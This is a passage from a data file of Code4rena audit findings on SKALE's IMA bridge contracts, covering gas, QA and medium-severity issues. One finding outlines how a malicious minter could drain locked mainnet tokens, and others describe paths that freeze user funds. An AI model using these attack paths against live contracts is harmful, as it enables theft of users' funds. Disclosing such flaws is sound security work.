791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L79-L87\n\n## [M] Changing bool to uint256 can save gas\n\nBooleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.\n\nSee: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol#L23-L27\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L98-L103\n\n```solidity=98\n    modifier messageInProgressLocker() {\n        require(!messageInProgress, \"Message is in progress\");\n        messageInProgress = true;\n        _;\n        messageInProgress = false;\n    }\n```\n\n### Recommendation\n```solidity=98\n    modifier messageInProgressLocker() {\n        require(messageInProgress == 1, \"Message is in progress\");\n        messageInProgress = 0;\n        _;\n        messageInProgress = 1;\n    }\n```\n## [M] Setting `uint256` variables to `0` is redundant\n\nSetting `uint256` variables to `0` is redundant as they default to `0`.\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L234-L234\n\n```solidity=234\n        uint notReimbursedGas = 0;\n```\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L118-L118\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L235-L235\n\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L149-L151\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L76-L81\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L79-L87\n\n## [N] Unnecessary checked arithmetic in for loops\n\nThere is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in for `for (uint256 i; i < count; ++i)`).\n\nIncrements perform overflow checks that are not necessary in this case.\n\n### Recommendation\n\nSurround the increment expressions with an `unchecked { ... }` block to avoid the default overflow checks. For example, change the for loop:\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/60"
    }
  },
  {
    "title": "[WP-H3] S2S Transfer from the origin schain to another schain with automatic deploy disabled can cause funds to be frozen",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L289-L301\n\n\n# Vulnerability details\n\nWhen moving tokens that are native on the origin schain, to another schain, `TokenManagerERC20.sol#transferToSchainERC20()` will be called, which calls `_exit()` -> `_receiveERC20()`:\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L289-L301\n\n```solidity\nif (isMainChainToken) {\n    data = _receiveERC20(\n        chainHash,\n        address(contractOnSchain),\n        msg.sender,\n        amount\n    );\n    _saveTransferredAmount(chainHash, address(contractOnSchain), amount);\n    require(\n        contractOnSchain.transferFrom(msg.sender, address(this), amount),\n        \"Transfer was failed\"\n    );\n}\n```\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L351-L361\n\n```solidity\nbool isERC20AddedToSchain = _schainToERC20[chainHash].contains(erc20OnMainChain);\nif (!isERC20AddedToSchain) {\n    _addERC20ForSchain(chainHash, erc20OnMainChain);\n    data = Messages.encodeTransferErc20AndTokenInfoMessage(\n        erc20OnMainChain,\n        to,\n        amount,\n        _getErc20TotalSupply(erc20),\n        _getErc20TokenInfo(erc20)\n    );\n}\n```\n\nHowever, on the target schain, while handling the inbound message with `postMessage()` -> `_sendERC20()`, when `contractOnSchain` is `false`, The transaction will fail with `\"Automatic deploy is disabled\"` when `automaticDeploy == false`:\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L227-L235\n\n```solidity\n contractOnSchain = clonesErc20[fromChainHash][token];\n\nif (address(contractOnSchain) == address(0)) {\n    require(automaticDeploy, \"Automatic deploy is disabled\");\n    contractOnSchain = new ERC20OnChain(message.tokenInfo.name, message.tokenInfo.symbol);\n    clonesErc20[fromChainHash][token] = contractOnSchain;\n    addedClones[contractOnSchain] = true;\n    emit ERC20TokenCreated(fromChainHash, token, address(contractOnSchain));\n}\n```\n\nAs a result, any tokens that are locked in the origin schain by the user will be frozen in the contract.\n\n### Recommendation\n\nConsider adding a `mapping` storage to cache whether `automaticDeploy` is enabled on a certain schain, the cache should be updated once the `automaticDeploy` is updated.\n\nAnd only allows S2S transfer when `automaticDeploy` is enabled on the target schain.\n\nTo further avoid the edge case of: right after the user submitted the S2S transfer tx on the from schain, the target schain disabled `automaticDeploy` and the user's tokens can be frozen in the from schain. We can introduce a 24 hrs timelock for disabling `automaticDeploy`.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/59"
    }
  },
  {
    "title": "[WP-H2] When transferring tokens native on SKALE to Ethereum with `TokenManagerERC20.exitToMainERC20()`, the tokens on the schain will be frozen on `TokenManagerERC20`, but they will not receive tokens on Ethereum",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L95-L104\n\n\n# Vulnerability details\n\nIn the current implementation of `TokenManagerERC20`, it allows `exitToMainERC20(tokenOnSchain, amount)`.\n\nAt L277 of `TokenManagerERC20.sol` in `exitToMainERC20()`, if `tokenOnSchain` is minted on SKALE schain natively, there are no such require statement that prevents the target chain being mainnet, eg: `require(chainHash != MAINNET_HASH, \"...\")`\n\nTherefore, a user can set mainnet as the target chain, and at L298 of `TokenManagerERC20.sol`, the tokens will be transferred to the contract, and at L308,  send message to Ethereum mainnet.\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L95-L104\n\n```solidity\n    function exitToMainERC20(\n        address contractOnMainnet,\n        uint256 amount\n    )\n        external\n        override\n    {\n        communityLocker.checkAllowedToSendMessage(msg.sender);\n        _exit(MAINNET_HASH, depositBox, contractOnMainnet, msg.sender, amount);\n    }\n```\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L264-L313\n\n```solidity\n    function _exit(\n        bytes32 chainHash,\n        address messageReceiver,\n        address contractOnMainChain,\n        address to,\n        uint256 amount\n    )\n        private\n    {\n        bool isMainChainToken;\n        ERC20BurnableUpgradeable contractOnSchain = clonesErc20[chainHash][contractOnMainChain];\n        if (address(contractOnSchain) == address(0)) {\n            contractOnSchain = ERC20BurnableUpgradeable(contractOnMainChain);\n            isMainChainToken = true;\n        }\n        require(address(contractOnSchain).isContract(), \"No token clone on schain\");\n        require(contractOnSchain.balanceOf(msg.sender) >= amount, \"Insufficient funds\");\n        require(\n            contractOnSchain.allowance(\n                msg.sender,\n                address(this)\n            ) >= amount,\n            \"Transfer is not approved by token holder\"\n        );\n        bytes memory data = Messages.encodeTransferErc20Message(address(contractOnMainChain), to, amount);\n        if (isMainChainToken) {\n            data = _receiveERC20(\n                chainHash,\n                address(contractOnSchain),\n                msg.sender,\n                amount\n            );\n            _saveTransferredAmount(chainHash, address(contractOnSchain), amount);\n            require(\n                contractOnSchain.transferFrom(msg.sender, address(this), amount),\n                \"Transfer was failed\"\n            );\n        } else {\n            require(\n                contractOnSchain.transferFrom(msg.sender, address(this), amount),\n                \"Transfer was failed\"\n            );\n            contractOnSchain.burn(amount);\n        }\n        messageProxy.postOutgoingMessage(\n            chainHash,\n            messageReceiver,\n            data\n        );\n    }\n```\n\nHowever, the `DepositBoxERC20` contract on Ethereum mainnet does not support such message from `TokenManagerERC20` on the schain:\n\nThe type of the message from schain `TokenManagerERC20` is `TRANSFER_ERC20_AND_TOKEN_INFO` (see L354 of TokenManagerERC20.sol) or `TRANSFER_ERC20_AND_TOTAL_SUPPLY` (see L362 of TokenManagerERC20.sol).\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L339-L370\n\n```solidity\n    function _receiveERC20(\n        bytes32 chainHash,\n        address erc20OnMainChain,\n        address to,\n        uint256 amount\n    )\n        private\n        returns (bytes memory data)\n    {\n        ERC20BurnableUpgradeable erc20 = ERC20BurnableUpgradeable(erc20OnMainChain);\n        uint256 totalSupply = erc20.totalSupply();\n        require(amount <= totalSupply, \"Amount is incorrect\");\n        bool isERC20AddedToSchain = _schainToERC20[chainHash].contains(erc20OnMainChain);\n        if (!isERC20AddedToSchain) {\n            _addERC20ForSchain(chainHash, erc20OnMainChain);\n            data = Messages.encodeTransferErc20AndTokenInfoMessage(\n                erc20OnMainChain,\n                to,\n                amount,\n                _getErc20TotalSupply(erc20),\n                _getErc20TokenInfo(erc20)\n            );\n        } else {\n            data = Messages.encodeTransferErc20AndTotalSupplyMessage(\n                erc20OnMainChain,\n                to,\n                amount,\n                _getErc20TotalSupply(erc20)\n            );\n        }\n        emit ERC20TokenReady(chainHash, erc20OnMainChain, amount);\n    }\n```\n\n`DepositBoxERC20` on Ethereum MAINNET can only process `TRANSFER_ERC20`. (see DepositBoxERC20.sol L155 and Messages.sol L270)\n\nWhen getting a message with the type of `TRANSFER_ERC20_AND_TOKEN_INFO` or `TRANSFER_ERC20_AND_TOTAL_SUPPLY` from schain `TokenManagerERC20`, it will revert at L270 of Messages.sol.\n\nAs a result, the schain tokens will be frozen on TokenManagerERC20, but they will not receive tokens on Ethereum.\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L143-L164\n\n```solidity\n    function postMessage(\n        bytes32 schainHash,\n        address sender,\n        bytes calldata data\n    )\n        external\n        override\n        onlyMessageProxy\n        whenNotKilled(schainHash)\n        checkReceiverChain(schainHash, sender)\n        returns (address)\n    {\n        Messages.TransferErc20Message memory message = Messages.decodeTransferErc20Message(data);\n        require(message.token.isContract(), \"Given address is not a contract\");\n        require(ERC20Upgradeable(message.token).balanceOf(address(this)) >= message.amount, \"Not enough money\");\n        _removeTransferredAmount(schainHash, message.token, message.amount);\n        require(\n            ERC20Upgradeable(message.token).transfer(message.receiver, message.amount),\n            \"Transfer was failed\"\n        );\n        return message.receiver;\n    }\n```\n\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L267-L272\n\n```solidity\n    function decodeTransferErc20Message(\n        bytes calldata data\n    ) internal pure returns (TransferErc20Message memory) {\n        require(getMessageType(data) == MessageType.TRANSFER_ERC20, \"Message type is not ERC20 transfer\");\n        return abi.decode(data, (TransferErc20Message));\n    }\n```\n\n### Recommendation\n\nConsider preventing moving schain native tokens to Ethereum MAINNET, for example: Add `require(chainHash != MAINNET_HASH, \"...\")` near L277 of TokenManagerERC20.sol.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/58"
    }
  },
  {
    "title": "QA Report",
    "body": "# Schain owner can censor user by not distributing sFUEL\n> SKALE chains operate in a gas-free environment using a native gas token called sFUEL. sFUEL has no economic value and is allocated from the SKALE chain owner \n\nIt is possible for schain owner to censor user / freeze user fund by not distributing enough sFUEL\n\n# setMinTransactionGas lack minimum value\nSince the base Tx gas cost is 21000, some global minimum can be hardcoded to avoid misconfiguration\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/CommunityPool.sol#196\n\n# _balanceIsSufficient use current tx.gasprice but the actual gasprice node will pay is unknown\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/CommunityPool.sol#220\n\n# Upgrade Solidity Version\nRecommended to upgrade to latest Solidity 0.8.12\n\n# Unresolved TODO\n````\ncontracts/schain/CommunityLocker.sol:219:        // TODO: uncomment when oracle finished\n````\n\n# Out-of-order encode-decode function\nSome of the decode function is not adjacent to its encode counterpart, which make reading the code a bit annoying (e.g. encodeTransferErc20Message and decodeTransferErc20Message) \nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol\n\n# depositERC20 lack input validation\n`DepositBoxERC20.depositERC20()` did not check if `amount!=0`\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/56"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# `> 0` is less efficient than `!= 0` for uint in require condition\nRef: https://twitter.com/GalloDaSballo/status/1485430908165443590\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L122\n``` \nrequire(approveTransfers[msg.sender] > 0, \"User has insufficient ETH\");\n```\n\n# Reuse value from storage\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/CommunityPool.sol#L98\n```\n        uint userWalletBal = _userWallets[user][schainHash];\n        if (amount > userWalletBal) {\n            amount = userWalletBal;\n            _userWallets[user][schainHash] = 0;\n        }else{\n            _userWallets[user][schainHash] = userWalletBal - amount;\n        }\n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/CommunityPool.sol#L171\n```\n        uint userWalletBal = _userWallets[msg.sender][schainHash];\n        require(amount <= userWalletBal, \"Balance is too low\");\n        require(!messageProxy.messageInProgress(), \"Message is in progress\");\n        _userWallets[msg.sender][schainHash] = userWalletBal - amount;\n```\n\n# Precalc keeack constant\nThe `keccak256(abi.encodePacked(\"Mainnet\"))` can be precalculated as constant\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBox.sol\n\n# Save gas by using schainName hash as input directly\nIt is a bit wasteful to use string schainName as input and hash it repeatedly onchain \n\n# Optimistic erc20 transfer\nCan save some gas by skiping the balance check and let it revert during the transfer\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L157\n```\nrequire(ERC20Upgradeable(message.token).balanceOf(address(this)) >= message.amount, \"Not enough money\");\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/55"
    }
  },
  {
    "title": "Not compatible with Rebasing/Deflationary/Inflationary tokens",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L299-L308\n\n\n# Vulnerability details\n\n## Proof of Concept\nThe `DepositBoxERC20` contract do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Recommended Mitigation Steps\nAdd support in contracts for such tokens before accepting user-supplied tokens\nConsider to check before/after balance on the vault.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/50"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Title\nMassive gas reduction just by reusing common logic in library\n\n# Vulnerability details\n\n## Impact\nMassive gas cost and contract size reductions. Since the total gas cost reduction is 518297 and the total size reduction is 2.397 KB, this report is shared as an individual report.\n\n## Proof of Concept\nThe function ``keccak256(abi.encodePacked(...))`` is called at many places in the codebase.\n\nHere are lists of files which uses ``keccak256(abi.encodePacked(...))`` function several times in ``mainnet`` directory. By using the function in the library instead of calling `keccak256(abi.encodePacked(...))`` function reach time can reduce the gas cost hugely.\n```\n/contracts/MessageProxy.sol\n/contracts/mainnet/CommunityPool.sol\n/contracts/mainnet/DepositBox.sol\n/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol b/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol\n/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol b/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol\n/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol b/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol\n/contracts/mainnet/DepositBoxes/DepositBoxEth.sol b/contracts/mainnet/DepositBoxes/DepositBoxEth.sol\n/contracts/mainnet/HashLibrary.sol b/contracts/mainnet/HashLibrary.sol\n/contracts/mainnet/MessageProxyForMainnet.sol b/contracts/mainnet/MessageProxyForMainnet.sol\n/contracts/mainnet/Twin.sol b/contracts/mainnet/Twin.sol\n```\n\nLinker.sol and SkaleManagerClient.sol also use ``keccak256(abi.encodePacked(...))`` function, but they use only this function once, and in this case, using library increases the gas cost. So in this report, Linker.sol and SkaleManagerClient.sol keep using ``keccak256(abi.encodePacked(...))`` function.\n\n## Tools Used\nTo check the actual size of the reduction, ``hardhat-gas-reporter`` is used. ( https://www.npmjs.com/package/hardhat-gas-reporter ). At each result, it lists how many size of the gas is reduced after the change.\n\n## Recommended Mitigation Steps\nFirst, create library which contains function to convert ``string calldata schainName`` and ``string memory schainName`` into ``bytes32`` using ``keccak256(abi.encodePacked(...))`` function.\n```\nlibrary HashLibrary {\n    function getHashFromCalldata(string calldata schainName) internal pure returns(bytes32) {\n        return keccak256(abi.encodePacked(schainName));\n    }    \n\n    function getHashFromMemory(string memory schainName) internal pure returns(bytes32) {\n        return keccak256(abi.encodePacked(schainName));\n    }    \n}\n```\n\nThen use these functions in ``HashLibrary`` library in each codebase.\nHere is an example of the modification.\n```\n// After\nfunction rechargeUserWallet(string calldata schainName, address user) external payable override {\n    bytes32 schainHash = HashLibrary.getHashFromCalldata(schainName);\n\n// Before\nfunction rechargeUserWallet(string calldata schainName, address user) external payable override {\n    bytes32 schainHash = keccak256(abi.encodePacked(schainName));\n```\n\nHere are results of the gas reduction observed at the local environment.\n\n|Deployments|Before-Avg (Runs:200)|After-Avg (Runs:200)|Improvement(%)|\n| ------------- | ------------- | ------------- |------------- |\n|CommunityPool|2114911|2083814|1.47%|\n|DepositBoxERC1155|4157660|4023142|3.23%|\n|DepositBoxERC20|3207840|3102364|3.29%|\n|DepositBoxERC721|3036407|2930860|3.47%|\n|DepositBoxEth|2625776|2541459|3.21%|\n|Linker|1805737|1794702|0.61%|\n|MessageProxyForMainnet|3403300|3356993|1.36%|\n\nHere are results of the contract size reduction at the local environment.\n\n |Contract Name|  Size (KB)  |  Change (KB)  |\n | ------------- | ----------- | ------------- |\n |Linker|      8.069  |        0.051  |\n |CommunityPool|      9.409  |        0.144  |\n |DepositBoxEth|     11.528  |        0.390  |\n |DepositBoxERC721|     13.330  |        0.488  |\n |DepositBoxERC20|     14.124  |        0.488  |\n |MessageProxyForMainnet|     15.300  |        0.214  |\n |DepositBoxERC1155|     18.389  |        0.622  |\n\n\nIn total, the total contract size reduction is 2.397 KB after the change.\n\n\nHere is an output of ``git diff`` that can reduce the above mentioned gas usage. \n\nhttps://gist.github.com/TerrierLover/9c80fe4099ea149b7e2fc559fa8a844e\n\nThe base commit of the above ``git diff`` output is https://github.com/skalenetwork/ima-c4-audit/commit/11d6a6ae5bf16af552edd75183791375e501915f .\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/47"
    }
  },
  {
    "title": "QA Report",
    "body": "# Low Severity\n\n#### [L01] Outdated version of inherited contracts and upgrade library \n\n```\n@openzeppelin/contracts-upgradeable   4.3.2  -> 4.5.1 \n@openzeppelin/hardhat-upgrades        1.10.0 -> 1.14.0   \n```\n\n#### [L02] Not calling inherited function directly\n\nFor instance \nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/SkaleManagerClient.sol#L62\n\n```\nAccessControlEnumerableUpgradeable.__AccessControlEnumerable_init();\n```\nis not necessary. Just use `__AccessControlEnumerable_init();`. It compiles and all tests passed. \n\n\n\n#### [L03] Require messages not indicative of the contracts\nAlmost all `require` message has no indication of which contract it is coming from. It is a good practice for debugging and monitoring purposes to mark the contract that reverted.\n\nFor example, https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L188 \nthe revert message could be `\"MessageProxy: Extra contract is not registered\"`.\nMany other instances are also present in almost all contracts by globally search `require`.\n\n#### [L04] Use initializer instead of onlyInitializing\n\nIn `OpenZeppline-contracts-upgradeable` v4.5 `initializer` has a new modifier https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/20380ee699406211ae88c4edd11b0af87c8abdd6/contracts/proxy/utils/Initializable.sol#L72\n```\n    modifier onlyInitializing() {\n        require(_initializing, \"Initializable: contract is not initializing\");\n        _;\n    }\n``` \nto mark and protect the initializing functions that should not be called directly called. \n\nInstances such as \n- https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/SkaleManagerClient.sol#L54-L60 , which is inherited by `Twin.sol`\n\n- https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Twin.sol#L95-L101\n\n- https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBox.sol#L99-L107\n\n\n\n\n\n#### [L05] Inconsistent use of schainHash or schainName when referencing a schain\nThere is inconsistency in referring to a schain, sometimes by bytes32 hash, sometimes by string name in a single contract.\n\nFor example, in `SkaleManagerClient`, \n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/SkaleManagerClient.sol#L70-L73 uses schainNash and \nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/SkaleManagerClient.sol#L42-L48 uses schainName.\n\n Bytes32 should be preferred over string for gas-saving reasons.\n\n\n#### [L06] Schain owner cannot add ERC20 token manually as specified in the doc\n\nThe specification in the doc is inconsistent with the code. \nFor example in https://docs.skale.network/ima/1.2.x/managing-erc20  and the diagram \n https://docs.skale.network/ima/1.2.x/flows#_manual_setup_steps\nis not consistent with the code. \n\nMinter role in ERC20 is granted automatically either to `TokenManagerERC20` or to the deployer in the constructor.\n\n\n\n#### [L07] Outdated Solidity Version\nSolidity version `0.8.6` is used throughout. Many updates have been applied to the compiler. A more recent version such as `0.8.10` would work better. The latest version is `0.8.11`. \n\n\n#### [L08] Use OnlyRole() modifier from inherited contract AccessControlUpgradeable \n\nMany instances can be simplified using the `OnlyRole` modifier.\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/20380ee699406211ae88c4edd11b0af87c8abdd6/contracts/access/AccessControlUpgradeable.sol#L75-L78\n\nFor instance, https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/MessageProxyForSchain.sol#L237 and  https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/tokens/ERC20OnChain.sol#L60-L61 and many other role-based `require` statements.\n\n\n# Informational\n\n#### [N01] NatSpec on Events and Functions \nMany functions and events do not have `@param` and  `@return` labelled in Natspec,  for instance\n- https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/MessageProxyForSchain.sol#L245-L251\n- https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/MessageProxyForSchain.sol#L261-L265\n \n and many others. \n\n#### [N02] `initialize` functions positioned too much down the contract\n`initialize` function is a special feature in upgradeability patterns and often important and prone to grave consequences too. It is a good practice to put them at the beginning of the contract, like those in the OpenZeppelin-contracts-upgradeable library.\n\n\n#### [N03] Repeated code \n\nRepeated unimplemented function `postIncomingMessages()` in both \n- https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L152-L160\n\nand \"@skalenetwork/ima-interfaces/IMessageProxy.sol\" .\n\nOne can remove the one in `MessageProxy.sol` without affecting any test results.\n\n\n# Gas Saving\n\n#### [G01] public functions can be external\nHere are two example instances \n\n-  https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L262\n\n- https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L313\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/45"
    }
  },
  {
    "title": "transferredAmount on mainnet can be drained if a malicious account can mint more tokens on Schain",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L45\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/tokens/ERC20OnChain.sol#L49-L50\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L95\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/tokens/ERC20OnChain.sol#L60-L63\n\n\n# Vulnerability details\n\n## Impact\n\n\nAnyone on Schain that is able to mint more tokens, other than the mint action from `postMessage` in `tokenManagerERC20` by bridging tokens over, can potentially drain the locked tokens in `transferredAmount` in `depositBoxERC20` on mainnet by calling exit with the same amount of tokens in `transferredAmount[schainHash][token]`. \n\nThis will trap other users' funds on sChain and lost those funds on mainnet to the malicious attacker. \n\nAn example of proof of concept using `ERC20OnChian` is given below. This case may seem to be special as the deployer of the clone contract is malicious.  However, this is a potential risk that generalises to other custom contracts with any `mint` functionality. \n\n\n\n## Proof of Concept (with ERC20)\n\n\n- Malicious account deploys an ERC20 clone `ERC20OnChain` on Schain.\n\n- By deployment, the malicious account is assigned the MINTER_ROLE on `ERC20OnChain` in the constructor.\n\n```\n    constructor(\n        string memory contractName,\n        string memory contractSymbol\n    ) initializer\n    {\n        AccessControlEnumerableUpgradeable.__AccessControlEnumerable_init();\n        ERC20Upgradeable.__ERC20_init(contractName, contractSymbol);\n        ERC20BurnableUpgradeable.__ERC20Burnable_init();\n        _setRoleAdmin(MINTER_ROLE, MINTER_ROLE);\n        _setupRole(MINTER_ROLE, _msgSender());\n    }\n```\n\n - This ERC20 clone get registered on `tokenMangagerERC20.sol` by function `addERC20TokenByOwner`. \n```\n    function addERC20TokenByOwner(\n        string calldata targetChainName,\n        address erc20OnMainChain,\n        address erc20OnSchain\n     )\n```\n\n\n - The malicious account wait for more users to deposit tokens on `depositBoxERC20.depositERC20`, which will increase the amount in `transferredAmount[schainHash][token]`\n\n```\n    function depositERC20(\n        string calldata schainName,\n        address erc20OnMainnet,\n        uint256 amount\n    )\n```\n\n - Malicious account mint to his account the amount equal to `transferredAmount[schainHash][token]` on `ERC20OnChain`\n\n```\n    function mint(address account, uint256 value) external override {\n        require(hasRole(MINTER_ROLE, _msgSender()), \"Sender is not a Minter\");\n        _mint(account, value);\n    }\n```\n\n - Malicious account calls `exitToMainERC20` in `TokenManagerERC20`.\n\n```\n    function exitToMainERC20(\n        address contractOnMainnet,\n        uint256 amount\n    )\n        external\n        override\n    {\n        communityLocker.checkAllowedToSendMessage(msg.sender);\n        _exit(MAINNET_HASH, depositBox, contractOnMainnet, msg.sender, amount);\n    }\n```\n\n - `transferredAmount[schainHash][token]` is drained to the malicious account on mainnet and victims' tokens get stranded on schain. \n\n\n\n\n## Tools Used\n\n## Recommended Mitigation Steps\nDisable minting function 